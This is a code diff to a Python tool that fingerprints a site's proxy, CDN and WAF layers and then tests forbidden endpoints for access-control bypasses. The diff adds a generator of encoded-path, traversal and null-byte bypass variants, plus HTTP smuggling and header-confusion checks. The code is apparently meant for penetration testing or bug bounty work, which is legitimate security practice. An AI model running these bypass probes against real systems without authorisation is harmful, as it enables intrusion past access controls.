@@ -162,7 +162,60 @@ class ProgressiveStackAnalyzer:
     Analyzes infrastructure stack progressively using header timeline,
     behavioral testing, and timing analysis for accurate reconstruction.
     """
-    
+
+    # Maps known component aliases to a canonical technology family.
+    # Used to deduplicate layers that represent the same technology detected
+    # via different fingerprint categories (e.g. nodejs vs nodejs_express).
+    _TECH_FAMILY: Dict[str, str] = {
+        # Node.js / Express
+        'nodejs_express': 'nodejs', 'express': 'nodejs',
+        # Ruby
+        'rails': 'ruby_on_rails', 'ruby_on_rails': 'ruby_on_rails',
+        # Python
+        'django': 'python_django', 'python_django': 'python_django',
+        'flask': 'python_flask',
+        # PHP
+        'laravel': 'php_laravel', 'php_laravel': 'php_laravel',
+        # Java
+        'spring': 'java_spring', 'spring_boot': 'java_spring', 'java_spring': 'java_spring',
+        # .NET
+        'aspnet': 'dotnet', 'aspnet_core': 'dotnet', 'dotnet': 'dotnet',
+        # Imperva / Incapsula — same vendor
+        'imperva': 'imperva', 'imperva_incapsula': 'imperva', 'imperva_waf': 'imperva',
+        # Cloudflare — CDN, WAF, Cache, Workers are all one vendor hop
+        'cloudflare': 'cloudflare',
+        'cloudflare_waf': 'cloudflare',
+        'cloudflare_cache': 'cloudflare',
+        'cloudflare_workers': 'cloudflare',
+        'cloudflare_cdn': 'cloudflare',
+        'cloudflare_pages': 'cloudflare',
+        # Akamai
+        'akamai': 'akamai', 'akamai_waf': 'akamai', 'akamai_cdn': 'akamai',
+        'akamai_kona': 'akamai',
+        # Fastly
+        'fastly': 'fastly', 'fastly_shield': 'fastly',
+        # nginx — proxy and reverse-proxy are the same binary
+        'nginx': 'nginx', 'nginx_proxy': 'nginx', 'nginx_ingress': 'nginx',
+        # Apache
+        'apache': 'apache', 'apache_traffic_server': 'apache',
+        # HAProxy
+        'haproxy': 'haproxy',
+        # Varnish
+        'varnish': 'varnish',
+        # Squid
+        'squid': 'squid',
+        # AWS
+        'aws_cloudfront': 'aws_cloudfront',
+        'aws_alb': 'aws_lb', 'aws_nlb': 'aws_lb', 'aws_elb': 'aws_lb',
+        # GCP
+        'gcp_lb': 'gcp_lb', 'gcp_cloud_armor': 'gcp_lb',
+        # Citrix / NetScaler
+        'citrix_netscaler': 'citrix_netscaler', 'citrix_netscaler_lb': 'citrix_netscaler',
+        'netscaler': 'citrix_netscaler',
+        # F5
+        'f5_big_ip': 'f5', 'f5_asm': 'f5', 'f5': 'f5',
+    }
+
     def __init__(self, target_url: str):
         self.target_url = target_url.rstrip('/')
         self.parsed_url = urlparse(target_url)
@@ -1737,6 +1790,33 @@ class ProgressiveStackAnalyzer:
         # Phase 4: Check for hidden layers (no header evidence)
         self.detect_hidden_layers()
 
+        # Phase 5: Deduplicate layers that represent the same technology
+        self._deduplicate_layers()
+
+    def _deduplicate_layers(self):
+        """
+        Remove duplicate layers for the same canonical technology family.
+        When duplicates exist (e.g. 'nodejs' BACKEND and 'nodejs_express' FRAMEWORK),
+        keep the layer with the highest confidence score.
+        Preserves insertion order of the first (or best-confidence) representative.
+        """
+        # first pass: find the best-confidence index for each canonical family
+        best: Dict[str, int] = {}  # family → index in self.stack['layers']
+        for i, layer in enumerate(self.stack['layers']):
+            component = layer.get('component', '')
+            family = self._TECH_FAMILY.get(component, component)
+            if family not in best:
+                best[family] = i
+            else:
+                prev_conf = self.stack['layers'][best[family]].get('confidence', 0)
+                if layer.get('confidence', 0) > prev_conf:
+                    best[family] = i
+
+        keep = set(best.values())
+        self.stack['layers'] = [
+            layer for i, layer in enumerate(self.stack['layers']) if i in keep
+        ]
+
     def _promote_timeline_hops_to_layers(self, timeline: List[Dict]):
         """
         For each timeline hop not already represented in self.stack['layers'],
@@ -1750,8 +1830,15 @@ class ProgressiveStackAnalyzer:
           and there are further hops of the same type in the timeline (e.g. multiple
           Via-header proxy hops).
         """
-        # Build a lookup of components already added to layers
+        # Build a lookup of components already added to layers (by component and family)
         existing_components = {layer['component'] for layer in self.stack['layers']}
+        existing_families = {self._TECH_FAMILY.get(layer['component'], layer['component'])
+                             for layer in self.stack['layers']}
+        # Types already handled by deep fingerprinting — don't add more of the same type
+        # from the timeline. Deep fingerprinting already picked the best representative.
+        deep_covered_types = {layer['type']
+                              for layer in self.stack['layers']
+                              if layer.get('source') != 'timeline'}
 
         for hop in timeline:
             timeline_type = hop.get('type', '')
@@ -1762,9 +1849,15 @@ class ProgressiveStackAnalyzer:
                 continue
 
             component = hop.get('component') or hop.get('name') or 'unknown'
+            family = self._TECH_FAMILY.get(component, component)
 
-            # Skip if this exact component is already a layer
-            if component in existing_components:
+            # Skip if this exact component or its canonical family is already a layer
+            if component in existing_components or family in existing_families:
+                continue
+
+            # Skip if deep fingerprinting already produced a layer of this type.
+            # Multiple timeline hops of the same type add noise, not signal.
+            if canonical_type in deep_covered_types:
                 continue
 
             self.stack['layers'].append({
@@ -1777,7 +1870,8 @@ class ProgressiveStackAnalyzer:
                 'source': 'timeline',       # marks this as timeline-derived
             })
             existing_components.add(component)
-    
+            existing_families.add(family)
+
     def deep_cdn_fingerprinting(self, response: requests.Response):
         """
         Deep CDN analysis using ALL data from fingerprint list.
@@ -3544,11 +3638,13 @@ class DiscrepancyTester:
                 content_len = len(response.content)
 
                 # Check for bypass (status code change)
-                if status not in [400, 401, 403, 429]:
+                if status not in [400, 401, 403, 404, 429]:
                     is_confirmed_bypass = status in [200, 201, 202, 204]
                     severity = 'CRITICAL' if is_confirmed_bypass else 'LOW'
                     disc_type = 'Header Confusion Bypass' if is_confirmed_bypass else 'Header Confusion Discrepancy'
                     label = '[!] Bypass Confirmed' if is_confirmed_bypass else '[~] Discrepancy (not a bypass)'
+                    if not is_confirmed_bypass and severity == 'LOW':
+                        continue
                     self.discrepancies.append({
                         'type': disc_type,
                         'test_name': test['name'],
@@ -3857,8 +3953,10 @@ class DiscrepancyTester:
                 test_url = f"{parsed.scheme}://{parsed.netloc}{variant}"
                 response = self.session.get(test_url, timeout=5)
                 
-                if response.status_code not in [403, 401, 400, 429]:
+                if response.status_code not in [403, 401, 400, 404, 429]:
                     is_confirmed_bypass = response.status_code in [200, 201, 202, 204]
+                    if not is_confirmed_bypass:
+                        continue
                     self.discrepancies.append({
                         'type': 'Encoding Confusion',
                         'original_path': base_path,
@@ -3930,8 +4028,10 @@ class DiscrepancyTester:
             try:
                 response = self.session.post(self.forbidden_endpoint, headers=headers, data='test', timeout=5)
 
-                if response.status_code not in [403, 401, 405, 429]:
+                if response.status_code not in [403, 401, 404, 405, 429]:
                     is_confirmed_bypass = response.status_code in [200, 201, 202, 204]
+                    if not is_confirmed_bypass:
+                        continue
                     self.discrepancies.append({
                         'type': 'Content-Type Confusion',
                         'content_type': headers.get('Content-Type', ''),
@@ -4004,7 +4104,7 @@ class DiscrepancyTester:
                 # 400 Bad Request  → server correctly rejected the malformed Host
                 # 421 Misdirected Request → server correctly refused the wrong-host request
                 # Both are expected security behaviour, not exploitable discrepancies.
-                if response.status_code not in [400, 401, 403, 421, 429]:
+                if response.status_code not in [400, 401, 403, 404, 421, 429]:
                     self.discrepancies.append({
                         'type': 'Host Header Attack',
                         'headers': headers,
@@ -4120,16 +4220,94 @@ class DiscrepancyTester:
         except:
             pass
 
+    def _make_path_encoding_variants(self, path: str) -> List[Tuple[str, str]]:
+        """
+        Generate character-level and structural encoding bypass variants for *path*.
+        All variants are root-relative paths (start with '/') and are tested against
+        the target origin (scheme + host), NOT appended to the forbidden endpoint.
+        """
+        import urllib.parse as _up
+
+        if not path or path == '/':
+            return []
+
+        seen: set = set()
+        variants: List[Tuple[str, str]] = []
+
+        def add(name: str, variant: str) -> None:
+            if variant and variant not in seen and variant != path:
+                seen.add(variant)
+                variants.append((name, variant))
+
+        # --- Character-level: encode first alpha char in all common schemes ---
+        for i, ch in enumerate(path):
+            if ch.isalpha():
+                add('Hex lower',          path[:i] + f'%{ord(ch):02x}' + path[i+1:])
+                add('Hex upper',          path[:i] + f'%{ord(ch):02X}' + path[i+1:])
+                add('Unicode IIS lower',  path[:i] + f'%u{ord(ch):04x}' + path[i+1:])
+                add('Unicode IIS upper',  path[:i] + f'%U{ord(ch):04x}' + path[i+1:])
+                add('Octal',              path[:i] + f'%0{oct(ord(ch))[2:]}' + path[i+1:])
+                add('Decimal',            path[:i] + f'%{ord(ch)}' + path[i+1:])
+                break
+
+        # --- Double / triple encoding of the full path ---
+        single_enc = _up.quote(path, safe='/')
+        double_enc = single_enc.replace('%', '%25')
+        triple_enc = double_enc.replace('%', '%25')
+        add('Double encoded',  double_enc)
+        add('Triple encoded',  triple_enc)
+
+        # --- Slash representation bypasses ---
+        add('Encoded slash',            path.replace('/', '%2f'))
+        add('Double encoded slash',     path.replace('/', '%252f'))
+        add('Backslash encoded',        path.replace('/', '%5c'))
+        add('Backslash double encoded', path.replace('/', '%255c'))
+        add('Unicode division slash',   path.replace('/', '%e2%88%95'))
+        add('Unicode fullwidth slash',  path.replace('/', '%ef%bc%8f'))
+        add('Unicode fraction slash',   path.replace('/', '%e2%81%84'))
+        add('Overlong UTF-8 slash',     path.replace('/', '%c0%af'))
+        add('Overlong UTF-8 dot-slash', path.replace('/', '%c0%ae%c0%ae%c0%af'))
+
+        # --- Dot-segment traversal (only when path has ≥2 segments) ---
+        if '/' in path[1:]:
+            parent, leaf = path.rsplit('/', 1)
+            add('Dot bypass',             parent + '/./' + leaf)
+            add('Dot-dot bypass',         parent + '/../' + leaf)
+            add('Encoded dot-dot',        parent + '/%2e%2e/' + leaf)
+            add('Double encoded dot-dot', parent + '/%252e%252e/' + leaf)
+            add('Mixed dot',              parent + '/.%2e/' + leaf)
+            add('Double slash segment',   path.replace('/', '//'))
+
+        # --- Trailing terminators appended to the path ---
+        for suffix_name, suffix in [
+            ('Null byte',             '%00'),
+            ('Double encoded null',   '%2500'),
+            ('Tab',                   '%09'),
+            ('Newline',               '%0a'),
+            ('CRLF',                  '%0d%0a'),
+            ('Encoded question mark', '%3f'),
+            ('Encoded hash',          '%23'),
+            ('Encoded semicolon',     '%3b'),
+        ]:
+            add(suffix_name + ' append', path + suffix)
+
+        return variants
+
     def test_nested_encoding_confusion(self):
         """Test nested encoding state stack confusion"""
         print("  🔢 Testing Nested Encoding Confusion...")
 
-        # Mixed UTF-8 and UTF-16 BOM switching
+        # Parse the actual forbidden endpoint so all tests target the right path
+        parsed_fe = urlparse(self.forbidden_endpoint)
+        origin = f"{parsed_fe.scheme}://{parsed_fe.netloc}"
+        forbidden_path = parsed_fe.path or '/'
+
+        # Mixed UTF-8 and UTF-16 BOM switching (sent as request body)
         try:
-            payload = b'\xef\xbb\xbf/admin\xff\xfe'
+            bom_payload = b'\xef\xbb\xbf' + forbidden_path.encode() + b'\xff\xfe'
             response = self.session.get(
                 self.forbidden_endpoint,
-                data=payload,
+                data=bom_payload,
                 headers={'Content-Type': 'text/plain'},
                 timeout=5
             )
@@ -4138,8 +4316,9 @@ class DiscrepancyTester:
                 discrepancy = {
                     'type': 'Nested Encoding',
                     'subtype': 'BOM Switching',
-                    'description': 'Mixed BOM encoding accepted',
-                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
+                    'description': f'Mixed BOM encoding accepted for {forbidden_path}',
+                    'payload': f'UTF-8 BOM + {forbidden_path} + UTF-16 BOM',
+                    'forbidden_url': self.forbidden_endpoint,
                     'response_code': response.status_code
                 }
                 self.chain_map['discrepancies'].append(discrepancy)
@@ -4147,68 +4326,21 @@ class DiscrepancyTester:
         except:
             pass
 
-        # Percent-Encoding in Different Bases
-        encoding_variations = [
-            ('Hex Standard', '/%61dmin'),
-            ('Octal', '/%0141dmin'),
-            ('Unicode IIS', '/%u0061dmin'),
-            ('Double Decimal', '/%%36%31dmin'),
-            ('Hex lower', '/%61dmin'),
-            ('Hex upper', '/%41dmin'),
-            ('Hex mixed', '/%4Admin'),
-            ('Incomplete hex', '/%6dmin'),
-            ('Invalid hex tolerated', '/%6Gdmin'),
-            ('Double encoded hex', '/%2561dmin'),
-            ('Triple encoded hex', '/%252561dmin'),
-            ('Double slash', '/%252fadmin'),
-            ('Double dot', '/%252e%252e/admin'),
-            ('Hex + literal', '/%61d%6din'),
-            ('Hex + slash', '/%61d%2fmin'),
-            ('Hex + dot', '/%2e%2e%2fadmin'),
-            ('Mixed case slash', '/%2Fadmin'),
-            ('Unicode IIS', '/%u0061dmin'),
-            ('Unicode uppercase', '/%U0061dmin'),
-            ('Unicode slash', '/%u2215admin'),
-            ('Unicode dot', '/%u002e%u002e%u2215admin'),
-            ('Overlong UTF-8 slash', '/%c0%afadmin'),
-            ('Overlong UTF-8 dot', '/%c0%ae%c0%ae%c0%afadmin'),
-            ('UTF-16 encoded slash', '/%00%2fadmin'),
-            ('UTF-16 encoded dot', '/%00%2e%00%2e%00%2fadmin'),
-            ('Encoded slash', '/%2fadmin'),
-            ('Double encoded slash', '/%252fadmin'),
-            ('Mixed slash', '/%2f%2fadmin'),
-            ('Backslash encoded', '/%5cadmin'),
-            ('Double encoded backslash', '/%255cadmin'),
-            ('Encoded dot', '/%2e/admin'),
-            ('Encoded dot-dot', '/%2e%2e/admin'),
-            ('Double encoded dot-dot', '/%252e%252e/admin'),
-            ('Mixed dot', '/.%2e/admin'),
-            ('Unicode fullwidth slash', '/%ef%bc%8fadmin'),
-            ('Unicode division slash', '/%e2%88%95admin'),
-            ('Unicode fraction slash', '/%e2%81%84admin'),
-            ('Null byte', '/admin%00'),
-            ('Encoded null', '/admin%2500'),
-            ('Tab encoded', '/admin%09'),
-            ('Newline encoded', '/admin%0a'),
-            ('CRLF encoded', '/admin%0d%0a'),
-            ('Encoded question mark', '/admin%3f'),
-            ('Encoded hash', '/admin%23'),
-            ('Encoded semicolon', '/admin%3b'),
-            ('Decimal encoding', '/%97dmin'),
-            ('Octal variant', '/%0141dmin'),
-            ('Mixed octal/hex', '/%0141%64min')
-
-        ]
+        # Percent-Encoding bypass variants derived from the actual forbidden path
+        encoding_variations = self._make_path_encoding_variants(forbidden_path)
 
         for name, path in encoding_variations:
             try:
-                response = self.session.get(f"{self.forbidden_endpoint}{path}", timeout=5)
+                test_url = f"{origin}{path}"
+                response = self.session.get(test_url, timeout=5)
                 if response.status_code == 200:
                     discrepancy = {
                         'type': 'Nested Encoding',
                         'subtype': f'{name} Encoding',
-                        'description': f'{name} encoding decoded to /admin',
+                        'description': f'{name} encoding bypass for {forbidden_path}',
                         'encoded_path': path,
+                        'test_url': test_url,
+                        'forbidden_url': self.forbidden_endpoint,
                         'response_code': response.status_code
                     }
                     self.chain_map['discrepancies'].append(discrepancy)
@@ -4222,8 +4354,6 @@ class DiscrepancyTester:
         # e su report BBP per file-type filter bypass in Express/nginx.
         ext_suffix_mutations = [
             ('Double-encoded null + .md',  '%2500.md'),
-            ('Double-encoded null + .pdf', '%2500.pdf'),
-            ('Double-encoded null + .txt', '%2500.txt'),
             ('Double-encoded null + .jpg', '%2500.jpg'),
             ('Raw null byte + .md',        '%00.md'),
             ('Encoded newline + .md',      '%0a.md'),
@@ -4855,13 +4985,19 @@ class DiscrepancyTester:
                         timeout=5
                     )
 
-                if marker in response.text or response.status_code in [400, 413, 414]:
+                marker_echoed = marker in response.text
+                # 400/413/414 = server correctly rejected malformed request → not a vulnerability.
+                # Record only when: marker echoed back, or server gave unexpected 2xx/5xx.
+                unexpected_status = response.status_code in [200, 201, 202, 500, 502, 503]
+                if marker_echoed or unexpected_status:
                     discrepancy = {
                         'type': 'HTTP Smuggling',
                         'test_id': f'smuggling_{i}',
                         'payload': payload,
                         'response_code': response.status_code,
-                        'evidence': marker in response.text
+                        'evidence': marker_echoed,
+                        'severity': 'CRITICAL' if marker_echoed else 'MEDIUM',
+                        'is_confirmed_bypass': marker_echoed,
                     }
                     self.chain_map['discrepancies'].append(discrepancy)
                     self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
@@ -4945,13 +5081,16 @@ class DiscrepancyTester:
             try:
                 response = self.session.get(f"{self.forbidden_endpoint}{encoding['path']}")
 
-                if response.status_code != baseline.status_code:
+                if (baseline.status_code in [401, 403]
+                        and response.status_code in [200, 201, 202, 204]):
                     discrepancy = {
                         'type': 'Encoding Discrepancy',
                         'encoding_name': encoding['name'],
                         'encoded_path': encoding['path'],
                         'baseline_code': baseline.status_code,
-                        'encoded_code': response.status_code
+                        'encoded_code': response.status_code,
+                        'severity': 'HIGH',
+                        'is_confirmed_bypass': True,
                     }
                     self.chain_map['discrepancies'].append(discrepancy)
                     self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
@@ -5152,7 +5291,7 @@ class DiscrepancyTester:
                     allow_redirects=False
                 )
                 status = response.status_code
-                if status not in [400, 401, 403, 429]:
+                if status not in [400, 401, 403, 404, 429]:
                     is_confirmed_bypass = status in [200, 201, 202, 203, 204, 205, 206]
                     if status in [200, 201]:
                         sev = 'CRITICAL'
@@ -5160,18 +5299,21 @@ class DiscrepancyTester:
                         sev = 'HIGH'
                     else:
                         sev = 'LOW'
-                    self.discrepancies.append({
-                        'type': 'Anchor Tag Mutation',
-                        'mutation_point': mp,
-                        'description': desc,
-                        'payload': payload,
-                        'method': 'POST',
-                        'forbidden_url': self.forbidden_endpoint,
-                        'response_code': status,
-                        'severity': sev,
-                        'is_confirmed_bypass': is_confirmed_bypass,
-                        'evidence': f'POST body: status changed 403 → {status}',
-                    })
+                    if sev == 'LOW' and not is_confirmed_bypass:
+                        pass
+                    else:
+                        self.discrepancies.append({
+                            'type': 'Anchor Tag Mutation',
+                            'mutation_point': mp,
+                            'description': desc,
+                            'payload': payload,
+                            'method': 'POST',
+                            'forbidden_url': self.forbidden_endpoint,
+                            'response_code': status,
+                            'severity': sev,
+                            'is_confirmed_bypass': is_confirmed_bypass,
+                            'evidence': f'POST body: status changed 403 → {status}',
+                        })
                     if is_confirmed_bypass:
                         confirmed += 1
                         print(f"    ✅ Bypass Confirmed [{mp}] {desc} → {status}")
@@ -5190,7 +5332,7 @@ class DiscrepancyTester:
                     allow_redirects=False
                 )
                 status = response.status_code
-                if status not in [400, 401, 403, 429]:
+                if status not in [400, 401, 403, 404, 429]:
                     is_confirmed_bypass = status in [200, 201, 202, 203, 204, 205, 206]
                     if status in [200, 201]:
                         sev = 'CRITICAL'
@@ -5198,18 +5340,19 @@ class DiscrepancyTester:
                         sev = 'HIGH'
                     else:
                         sev = 'LOW'
-                    self.discrepancies.append({
-                        'type': 'Anchor Tag Mutation',
-                        'mutation_point': mp,
-                        'description': desc,
-                        'payload': payload,
-                        'method': 'GET',
-                        'forbidden_url': test_url,
-                        'response_code': status,
-                        'severity': sev,
-                        'is_confirmed_bypass': is_confirmed_bypass,
-                        'evidence': f'GET param: status changed 403 → {status}',
-                    })
+                    if sev != 'LOW' or is_confirmed_bypass:
+                        self.discrepancies.append({
+                            'type': 'Anchor Tag Mutation',
+                            'mutation_point': mp,
+                            'description': desc,
+                            'payload': payload,
+                            'method': 'GET',
+                            'forbidden_url': test_url,
+                            'response_code': status,
+                            'severity': sev,
+                            'is_confirmed_bypass': is_confirmed_bypass,
+                            'evidence': f'GET param: status changed 403 → {status}',
+                        })
                     if is_confirmed_bypass:
                         confirmed += 1
                         print(f"    ✅ Bypass Confirmed [{mp}] {desc} (GET) → {status}")
@@ -6128,9 +6271,10 @@ class BypassGenerator:
     Generates custom bypass payloads based on discovered discrepancies.
     """
     
-    def __init__(self, discrepancies: List[Dict], stack_info: Dict):
+    def __init__(self, discrepancies: List[Dict], stack_info: Dict, forbidden_endpoint: str = ''):
         self.discrepancies = discrepancies
         self.stack_info = stack_info
+        self.forbidden_endpoint = forbidden_endpoint
         self.bypasses = []
     
     def generate_all_bypasses(self):
@@ -6852,7 +6996,8 @@ class ApplicationTraceroute:
         # Phase 4: Bypass Generation
         self.bypass_generator = BypassGenerator(
             discrepancies,
-            self.stack_analyzer.stack
+            self.stack_analyzer.stack,
+            self.forbidden_endpoint or ''
         )
         bypasses = self.bypass_generator.generate_all_bypasses()
         
